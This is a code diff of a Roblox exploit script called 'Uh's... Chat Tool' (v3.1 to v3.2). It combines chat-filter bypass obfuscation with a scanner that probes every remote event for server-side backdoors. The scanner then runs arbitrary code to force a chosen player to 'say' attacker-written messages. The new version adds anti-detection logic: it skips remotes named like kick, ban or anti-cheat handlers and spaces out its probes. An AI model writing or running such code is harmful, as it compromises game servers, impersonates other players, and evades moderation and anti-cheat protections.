@@ -1,9 +1,9 @@
 --[[
-    Uh's... Chat Tool v3.1 - Silent Edition (English)
+    Uh's... Chat Tool v3.2 - Silent Edition (English)
     - Display obfuscated chat bubbles above any player.
-    - Improved player search (Name / DisplayName, partial matches).
-    - Robust backdoor scanner with dummy‑instance verification.
-    - Optionally force a target player to "say" something via backdoor.
+    - Smart player search (partial Name/DisplayName).
+    - Stealthy backdoor scanner with anti-detection.
+    - Safe Mode: only tests chat-related remotes.
 --]]
 
 -- ========================================================================= --
@@ -20,10 +20,12 @@ local CONFIG = {
         Method = "Advanced" -- "Homoglyph", "ZeroWidth", "Combined", "Advanced"
     },
     Backdoor = {
-        AutoScan = true,
+        AutoScan = false,          -- Disabled by default for safety
         UseBubbleFallback = true,
-        ScanTimeout = 30,       -- seconds max waiting for dummy response
-        DelayFactor = 2.5       -- multiplier based on ping
+        ScanTimeout = 30,
+        DelayFactor = 2.5,
+        SafeMode = true,           -- Only test chat-related remotes
+        TestDelay = 0.5            -- Seconds between each remote test
     }
 }
 
@@ -75,6 +77,7 @@ local Chat = game:GetService("Chat")
 local LocalPlayer = Players.LocalPlayer
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
 -- ========================================================================= --
 --                      4. ADVANCED BYPASS ENGINE                           --
@@ -176,80 +179,102 @@ function BubbleManager:DisplayForSelf(message)
 end
 
 -- ========================================================================= --
---                   6. ROBUST BACKDOOR SCANNER (inspired by backdoor.exe)  --
+--                   6. STEALTH BACKDOOR SCANNER (Anti-Detection)           --
 -- ========================================================================= --
 local BackdoorScanner = {}
 BackdoorScanner.__index = BackdoorScanner
 
+-- Patterns that suggest a remote is chat-related (higher priority)
+local CHAT_PATTERNS = {
+    "SayMessage", "Chat", "Message", "SendMessage", "Talk", "Broadcast",
+    "DefaultChatSystemChatEvents", "ChatService", "TextChat"
+}
+
+-- Patterns that are almost certainly traps – AVOID
+local TRAP_PATTERNS = {
+    "Kick", "Ban", "Detect", "Anti", "Exploit", "Hack", "Script", "Logger",
+    "Punish", "Flag", "Report", "Admin", "Mod", "Secure", "Verify", "Check"
+}
+
 function BackdoorScanner.new(bypassEngine)
     local self = setmetatable({}, BackdoorScanner)
     self.Bypass = bypassEngine
-    self.WorkingGateway = nil       -- stores {Remote, ExecuteFunction}
+    self.WorkingGateway = nil
     self.AllRemotes = {}
+    self.SafeMode = CONFIG.Backdoor.SafeMode
+    self.TestDelay = CONFIG.Backdoor.TestDelay
     return self
 end
 
--- Collect all RemoteEvent / RemoteFunction instances, including nil instances if supported
-function BackdoorScanner:CollectRemotes()
+-- Score a remote based on how likely it is to be a chat backdoor (higher = better)
+local function scoreRemote(remote)
+    local score = 0
+    local fullPath = remote:GetFullName():lower()
+    
+    for _, pattern in ipairs(CHAT_PATTERNS) do
+        if fullPath:find(pattern:lower()) then
+            score = score + 50
+        end
+    end
+    
+    for _, pattern in ipairs(TRAP_PATTERNS) do
+        if fullPath:find(pattern:lower()) then
+            score = score - 1000
+        end
+    end
+    
+    local parent = remote.Parent
+    if parent then
+        if parent == game:GetService("ReplicatedStorage") then
+            score = score + 10
+        elseif parent:IsA("Folder") and parent.Name:lower():find("chat") then
+            score = score + 20
+        end
+    end
+    
+    if remote.Name == "RemoteEvent" or remote.Name == "RemoteFunction" then
+        score = score - 20
+    end
+    
+    return score
+end
+
+function BackdoorScanner:CollectRemotes(safeMode)
     local remotes = {}
     local function scan(obj, depth)
         if depth > 15 then return end
         for _, child in ipairs(obj:GetChildren()) do
             if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-                table.insert(remotes, child)
+                local score = scoreRemote(child)
+                if score > -500 then
+                    table.insert(remotes, {remote = child, score = score})
+                end
             end
             scan(child, depth + 1)
         end
     end
     scan(game, 0)
-
-    -- Also check common parent paths
-    local common = {
-        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"),
-        ReplicatedStorage:FindFirstChild("ChatService"),
-        game:FindFirstChild("Chat"),
-        game:FindFirstChild("ServerScriptService")
-    }
-    for _, container in ipairs(common) do
-        if container then
-            for _, child in ipairs(container:GetDescendants()) do
-                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-                    if not table.find(remotes, child) then
-                        table.insert(remotes, child)
-                    end
-                end
-            end
-        end
+    
+    table.sort(remotes, function(a, b) return a.score > b.score end)
+    
+    local sortedRemotes = {}
+    for _, entry in ipairs(remotes) do
+        table.insert(sortedRemotes, entry.remote)
     end
-
-    -- Support for getnilinstances (if available)
-    if getnilinstances then
-        for _, inst in ipairs(getnilinstances()) do
-            if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
-                table.insert(remotes, inst)
-            end
-        end
-    end
-
-    self.AllRemotes = remotes
-    return remotes
+    
+    self.AllRemotes = sortedRemotes
+    return sortedRemotes
 end
 
--- Generate a unique random name (alphanumeric + symbols) that doesn't exist in Workspace
 function BackdoorScanner:GenerateUniqueName()
-    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=[]{}|;:,./?"
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     local name
     repeat
-        name = ""
-        for _ = 1, 8 do
-            local idx = math.random(1, #chars)
-            name = name .. chars:sub(idx, idx)
-        end
+        name = "BEXE_" .. chars:sub(math.random(1,26), math.random(1,26)) .. tostring(math.random(1000,9999))
     until not Workspace:FindFirstChild(name)
     return name
 end
 
--- Dummy payload that creates a BoolValue in Workspace with the unique name
 local DUMMY_PAYLOAD = [[
 local dummy = Instance.new("BoolValue")
 dummy.Name = "%s"
@@ -257,31 +282,46 @@ dummy.Parent = workspace
 game:GetService("Debris"):AddItem(dummy, 5)
 ]]
 
--- Scan all remotes, sending a dummy creation payload and listening for response
-function BackdoorScanner:Scan(timeout, delayFactor)
+function BackdoorScanner:Scan(timeout, delayFactor, safeMode)
     timeout = timeout or CONFIG.Backdoor.ScanTimeout
     delayFactor = delayFactor or CONFIG.Backdoor.DelayFactor
-
-    local remotes = self:CollectRemotes()
+    safeMode = (safeMode == nil) and self.SafeMode or safeMode
+    
+    local remotes = self:CollectRemotes(safeMode)
     if #remotes == 0 then
-        return nil, "No remotes found to test."
+        return nil, "No safe remotes found to test."
     end
-
+    
+    if safeMode then
+        local filtered = {}
+        for _, r in ipairs(remotes) do
+            if scoreRemote(r) > 0 then
+                table.insert(filtered, r)
+            end
+        end
+        remotes = filtered
+        if #remotes == 0 then
+            return nil, "No chat-related remotes found (safe mode)."
+        end
+    end
+    
     local connection
     local foundGateway = nil
     local dummyName = self:GenerateUniqueName()
     local payload = DUMMY_PAYLOAD:format(dummyName)
-
-    -- Listen for the dummy instance to appear
+    
     connection = Workspace.ChildAdded:Connect(function(child)
         if child.Name == dummyName then
-            foundGateway = self.WorkingGateway  -- set by the solver when sending
+            foundGateway = self.WorkingGateway
             connection:Disconnect()
         end
     end)
-
-    -- Define solver: for each remote, attempt to fire with the payload
-    local function testRemote(remote)
+    
+    local testDelay = math.max(0.1, self.TestDelay * (safeMode and 1 or 1.5))
+    
+    for _, remote in ipairs(remotes) do
+        if foundGateway then break end
+        
         local success, err = pcall(function()
             if remote:IsA("RemoteFunction") then
                 remote:InvokeServer(payload)
@@ -289,8 +329,8 @@ function BackdoorScanner:Scan(timeout, delayFactor)
                 remote:FireServer(payload)
             end
         end)
+        
         if success then
-            -- If no error, mark this remote as a candidate
             self.WorkingGateway = {
                 Remote = remote,
                 Execute = function(code)
@@ -301,35 +341,27 @@ function BackdoorScanner:Scan(timeout, delayFactor)
                     end
                 end
             }
+            task.wait(0.2)
         end
+        
+        task.wait(testDelay)
     end
-
-    -- Test all remotes (spawn each in a separate thread to avoid yielding)
-    for _, remote in ipairs(remotes) do
-        task.spawn(testRemote, remote)
-    end
-
-    -- Calculate timeout based on ping and number of remotes
-    local ping = LocalPlayer:GetNetworkPing()
-    local dynamicTimeout = math.max(ping * delayFactor * #remotes, timeout)
-    local endTime = tick() + dynamicTimeout
-
-    -- Wait for connection to be triggered or timeout
+    
+    local endTime = tick() + timeout
     while connection.Connected and tick() < endTime do
-        task.wait()
+        task.wait(0.1)
     end
     connection:Disconnect()
-
+    
     if foundGateway then
         self.WorkingGateway = foundGateway
-        return foundGateway, "Backdoor found: " .. foundGateway.Remote:GetFullName()
+        return foundGateway, "Backdoor found (safe mode: " .. tostring(safeMode) .. "): " .. foundGateway.Remote:GetFullName()
     else
         self.WorkingGateway = nil
-        return nil, "No backdoor responded after testing " .. #remotes .. " remotes."
+        return nil, "No backdoor responded. Try toggling Safe Mode off (higher risk)."
     end
 end
 
--- Execute arbitrary code on the server via the found backdoor
 function BackdoorScanner:Execute(code)
     if not self.WorkingGateway then
         return false, "No working backdoor available."
@@ -340,7 +372,6 @@ function BackdoorScanner:Execute(code)
     return success, err
 end
 
--- Force a target player to say a message (bypass applied)
 function BackdoorScanner:ForceSay(player, message)
     if not self.WorkingGateway then
         return false, "No backdoor available."
@@ -350,29 +381,24 @@ function BackdoorScanner:ForceSay(player, message)
     end
 
     local processed = self.Bypass:Process(message)
-    -- Server-side script to make player chat (works for legacy Chat and TextChatService)
     local scriptToRun = string.format([[
         local target = game:GetService("Players"):FindFirstChild("%s")
         if target then
             local chatService = game:GetService("Chat")
             local textChatService = game:GetService("TextChatService")
             local message = "%s"
-            -- Legacy chat
             if chatService and chatService:FindFirstChild("ChatWindow") then
                 local chatWindow = chatService:FindFirstChild("ChatWindow")
                 if chatWindow then
-                    -- Simulate chat
                     local replicatedStorage = game:GetService("ReplicatedStorage")
                     local sayMessageRequest = replicatedStorage:FindFirstChild("SayMessageRequest", true)
                     if sayMessageRequest then
                         sayMessageRequest:FireServer(message, "All")
                     else
-                        -- Fallback: use Chat:Chat()
                         chatService:Chat(target.Character.Head, message, "Blue")
                     end
                 end
             end
-            -- TextChatService (new system)
             if textChatService then
                 local textChannel = textChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
                 if textChannel then
@@ -384,7 +410,6 @@ function BackdoorScanner:ForceSay(player, message)
 
     local success, err = self:Execute(scriptToRun)
     if not success then
-        -- Fallback to bubble if enabled
         if CONFIG.Backdoor.UseBubbleFallback then
             local bubbleOk = BubbleManager:DisplayForPlayer(player, message)
             if bubbleOk then
@@ -400,7 +425,7 @@ end
 --                            7. UI CONSTRUCTION                            --
 -- ========================================================================= --
 local Window = Rayfield:CreateWindow({
-    Name = "Uh's... Chat Tool v3.1",
+    Name = "Uh's... Chat Tool v3.2",
     LoadingTitle = "Uh's... Chat",
     LoadingSubtitle = "Silent Edition",
     Theme = CONFIG.UI.Theme,
@@ -424,22 +449,14 @@ local CurrentMessage = ""
 local TargetPlayer = nil
 local TargetName = ""
 
--- Auto-scan on startup if enabled
+-- Optional auto-scan on startup
 if CONFIG.Backdoor.AutoScan then
     task.spawn(function()
         local gateway, msg = Scanner:Scan()
         if gateway then
-            Rayfield:Notify({
-                Title = "Backdoor Scanner",
-                Content = msg,
-                Duration = 5
-            })
+            Rayfield:Notify({ Title = "Backdoor Scanner", Content = msg, Duration = 5 })
         else
-            Rayfield:Notify({
-                Title = "Backdoor Scanner",
-                Content = msg,
-                Duration = 5
-            })
+            Rayfield:Notify({ Title = "Backdoor Scanner", Content = msg, Duration = 5 })
         end
     end)
 end
@@ -450,12 +467,11 @@ end
 local ChatTab = Window:CreateTab("Chat", "message-square")
 local SettingsTab = Window:CreateTab("Settings", "settings")
 
--- Preview update function
 local function UpdatePreview(para)
     if CurrentMessage ~= "" then
-        para:Set({Title = "Obfuscated Preview", Content = Bypass:Process(CurrentMessage)})
+        para:Set({ Title = "Obfuscated Preview", Content = Bypass:Process(CurrentMessage) })
     else
-        para:Set({Title = "Obfuscated Preview", Content = "..."})
+        para:Set({ Title = "Obfuscated Preview", Content = "..." })
     end
 end
 
@@ -471,7 +487,7 @@ local MsgInput = ChatTab:CreateInput({
 })
 
 ChatTab:CreateSection("Bypass Preview")
-local PreviewPara = ChatTab:CreateParagraph({Title = "Obfuscated Preview", Content = "..."})
+local PreviewPara = ChatTab:CreateParagraph({ Title = "Obfuscated Preview", Content = "..." })
 ChatTab:CreateButton({
     Name = "Refresh Preview",
     Callback = function() UpdatePreview(PreviewPara) end
@@ -482,14 +498,14 @@ ChatTab:CreateButton({
     Name = "Display Bubble on Yourself",
     Callback = function()
         if CurrentMessage == "" then
-            Rayfield:Notify({Title = "Error", Content = "Please enter a message.", Duration = 3})
+            Rayfield:Notify({ Title = "Error", Content = "Please enter a message.", Duration = 3 })
             return
         end
         local ok = BubbleMgr:DisplayForSelf(CurrentMessage)
         if ok then
-            Rayfield:Notify({Title = "Success", Content = "Bubble displayed above you!", Duration = 2})
+            Rayfield:Notify({ Title = "Success", Content = "Bubble displayed above you!", Duration = 2 })
         else
-            Rayfield:Notify({Title = "Failure", Content = "Could not display bubble.", Duration = 3})
+            Rayfield:Notify({ Title = "Failure", Content = "Could not display bubble.", Duration = 3 })
         end
     end
 })
@@ -503,7 +519,7 @@ local SearchInput = ChatTab:CreateInput({
     Name = "Search by Name or DisplayName",
     PlaceholderText = "Type to filter...",
     RemoveTextAfterFocus = false,
-    Callback = function(text) end -- we'll handle via manual update
+    Callback = function(text) end
 })
 
 local PlayerDropdown = ChatTab:CreateDropdown({
@@ -523,7 +539,7 @@ local PlayerDropdown = ChatTab:CreateDropdown({
     end
 })
 
-local TargetInfoPara = ChatTab:CreateParagraph({Title = "Current Target", Content = "None"})
+local TargetInfoPara = ChatTab:CreateParagraph({ Title = "Current Target", Content = "None" })
 
 function UpdateTargetInfo()
     if TargetPlayer then
@@ -532,13 +548,12 @@ function UpdateTargetInfo()
             Content = string.format("%s (@%s) | ID: %d", TargetPlayer.Name, TargetPlayer.DisplayName, TargetPlayer.UserId)
         })
     elseif TargetName ~= "" then
-        TargetInfoPara:Set({Title = "Target (Offline?)", Content = TargetName .. " - Not found online."})
+        TargetInfoPara:Set({ Title = "Target (Offline?)", Content = TargetName .. " - Not found online." })
     else
-        TargetInfoPara:Set({Title = "Current Target", Content = "None"})
+        TargetInfoPara:Set({ Title = "Current Target", Content = "None" })
     end
 end
 
--- Filter players based on search text (case-insensitive partial match on Name or DisplayName)
 local function FilterPlayers(searchText)
     local matches = {}
     local lowerSearch = searchText:lower()
@@ -556,7 +571,6 @@ local function FilterPlayers(searchText)
     return matches
 end
 
--- Connect search input to dropdown refresh
 local lastSearchText = ""
 local function OnSearchTextChanged()
     local text = SearchInput.CurrentValue or ""
@@ -564,7 +578,6 @@ local function OnSearchTextChanged()
     lastSearchText = text
     local options = FilterPlayers(text)
     PlayerDropdown:Refresh(options, true)
-    -- Auto-select first if only one match and it's a real player
     if #options == 1 and options[1] ~= "(no matches)" then
         TargetPlayer = Players:FindFirstChild(options[1])
         TargetName = options[1]
@@ -572,26 +585,22 @@ local function OnSearchTextChanged()
     end
 end
 
--- We need to poll the input value since Rayfield input callback only fires on focus loss.
--- Use a heartbeat connection.
-game:GetService("RunService").Heartbeat:Connect(function()
+RunService.Heartbeat:Connect(function()
     if SearchInput and SearchInput.CurrentValue ~= lastSearchText then
         OnSearchTextChanged()
     end
 end)
 
--- Manual refresh button
 ChatTab:CreateButton({
     Name = "Refresh Player List",
     Callback = function()
         local text = SearchInput.CurrentValue or ""
         local options = FilterPlayers(text)
         PlayerDropdown:Refresh(options, true)
-        Rayfield:Notify({Title = "Player List", Content = "List updated.", Duration = 2})
+        Rayfield:Notify({ Title = "Player List", Content = "List updated.", Duration = 2 })
     end
 })
 
--- Auto-refresh when players join/leave
 Players.PlayerAdded:Connect(function()
     task.wait(0.5)
     OnSearchTextChanged()
@@ -601,7 +610,6 @@ Players.PlayerRemoving:Connect(function()
     OnSearchTextChanged()
 end)
 
--- Initialize with all players
 task.spawn(function()
     task.wait(0.5)
     OnSearchTextChanged()
@@ -616,18 +624,18 @@ ChatTab:CreateButton({
     Name = "Display Bubble on Target (Visual)",
     Callback = function()
         if CurrentMessage == "" then
-            Rayfield:Notify({Title = "Error", Content = "Enter a message first.", Duration = 3})
+            Rayfield:Notify({ Title = "Error", Content = "Enter a message first.", Duration = 3 })
             return
         end
         if not TargetPlayer then
-            Rayfield:Notify({Title = "Error", Content = "Select a target first.", Duration = 3})
+            Rayfield:Notify({ Title = "Error", Content = "Select a target first.", Duration = 3 })
             return
         end
         local ok = BubbleMgr:DisplayForPlayer(TargetPlayer, CurrentMessage)
         if ok then
-            Rayfield:Notify({Title = "Success", Content = "Bubble displayed on " .. TargetPlayer.Name, Duration = 2})
+            Rayfield:Notify({ Title = "Success", Content = "Bubble displayed on " .. TargetPlayer.Name, Duration = 2 })
         else
-            Rayfield:Notify({Title = "Failure", Content = "Could not display bubble.", Duration = 3})
+            Rayfield:Notify({ Title = "Failure", Content = "Could not display bubble.", Duration = 3 })
         end
     end
 })
@@ -636,29 +644,28 @@ ChatTab:CreateButton({
     Name = "Force Target to Say (Backdoor)",
     Callback = function()
         if CurrentMessage == "" then
-            Rayfield:Notify({Title = "Error", Content = "Enter a message first.", Duration = 3})
+            Rayfield:Notify({ Title = "Error", Content = "Enter a message first.", Duration = 3 })
             return
         end
         if not TargetPlayer then
-            Rayfield:Notify({Title = "Error", Content = "Select a target first.", Duration = 3})
+            Rayfield:Notify({ Title = "Error", Content = "Select a target first.", Duration = 3 })
             return
         end
         if not Scanner.WorkingGateway then
-            -- Attempt a quick scan
-            Rayfield:Notify({Title = "Backdoor", Content = "No backdoor cached. Scanning...", Duration = 3})
+            Rayfield:Notify({ Title = "Backdoor", Content = "No backdoor cached. Scanning...", Duration = 3 })
             local gateway, msg = Scanner:Scan()
             if not gateway then
-                Rayfield:Notify({Title = "Scan Failed", Content = msg, Duration = 5})
+                Rayfield:Notify({ Title = "Scan Failed", Content = msg, Duration = 5 })
                 return
             else
-                Rayfield:Notify({Title = "Backdoor Found", Content = msg, Duration = 3})
+                Rayfield:Notify({ Title = "Backdoor Found", Content = msg, Duration = 3 })
             end
         end
         local success, info = Scanner:ForceSay(TargetPlayer, CurrentMessage)
         if success then
-            Rayfield:Notify({Title = "Backdoor Success", Content = info, Duration = 5})
+            Rayfield:Notify({ Title = "Backdoor Success", Content = info, Duration = 5 })
         else
-            Rayfield:Notify({Title = "Backdoor Failed", Content = info, Duration = 5})
+            Rayfield:Notify({ Title = "Backdoor Failed", Content = info, Duration = 5 })
         end
     end
 })
@@ -680,7 +687,7 @@ SettingsTab:CreateDropdown({
         local method = type(opt) == "table" and opt[1] or opt
         Bypass.Method = method
         CONFIG.Bypass.Method = method
-        Rayfield:Notify({Title = "Bypass", Content = "Method changed to " .. method, Duration = 2})
+        Rayfield:Notify({ Title = "Bypass", Content = "Method changed to " .. method, Duration = 2 })
     end
 })
 
@@ -698,13 +705,13 @@ SettingsTab:CreateToggle({
 SettingsTab:CreateButton({
     Name = "Re-scan for Backdoors",
     Callback = function()
-        Rayfield:Notify({Title = "Scanning", Content = "Searching for backdoors...", Duration = 2})
+        Rayfield:Notify({ Title = "Scanning", Content = "Searching for backdoors...", Duration = 2 })
         task.spawn(function()
             local gateway, msg = Scanner:Scan()
             if gateway then
-                Rayfield:Notify({Title = "Scan Complete", Content = msg, Duration = 5})
+                Rayfield:Notify({ Title = "Scan Complete", Content = msg, Duration = 5 })
             else
-                Rayfield:Notify({Title = "Scan Failed", Content = msg, Duration = 5})
+                Rayfield:Notify({ Title = "Scan Failed", Content = msg, Duration = 5 })
             end
         end)
     end
@@ -725,11 +732,50 @@ SettingsTab:CreateSlider({
     Callback = function(val) CONFIG.Backdoor.DelayFactor = val end
 })
 
+SettingsTab:CreateSection("Stealth & Anti-Detection")
+SettingsTab:CreateToggle({
+    Name = "Safe Mode (Only Test Chat Remotes)",
+    CurrentValue = Scanner.SafeMode,
+    Callback = function(val)
+        Scanner.SafeMode = val
+        CONFIG.Backdoor.SafeMode = val
+        Rayfield:Notify({
+            Title = "Safe Mode",
+            Content = val and "Enabled – lower detection risk." or "Disabled – scans all remotes (dangerous).",
+            Duration = 3
+        })
+    end
+})
+SettingsTab:CreateSlider({
+    Name = "Test Delay (seconds)",
+    Range = {0.1, 3.0},
+    Increment = 0.1,
+    CurrentValue = Scanner.TestDelay,
+    Callback = function(val)
+        Scanner.TestDelay = val
+        CONFIG.Backdoor.TestDelay = val
+    end
+})
+SettingsTab:CreateButton({
+    Name = "Quick Scan (Chat Only)",
+    Callback = function()
+        Rayfield:Notify({ Title = "Scanning", Content = "Searching chat backdoors (safe)...", Duration = 2 })
+        task.spawn(function()
+            local gateway, msg = Scanner:Scan(nil, nil, true)
+            if gateway then
+                Rayfield:Notify({ Title = "Scan Complete", Content = msg, Duration = 5 })
+            else
+                Rayfield:Notify({ Title = "Scan Failed", Content = msg, Duration = 5 })
+            end
+        end)
+    end
+})
+
 -- ========================================================================= --
 --                            10. FINALIZE                                  --
 -- ========================================================================= --
 Rayfield:Notify({
-    Title = "Uh's... Chat Tool v3.1",
+    Title = "Uh's... Chat Tool v3.2",
     Content = "Loaded! Use the search to find players, then display bubbles or force chat.",
     Duration = 6
 })
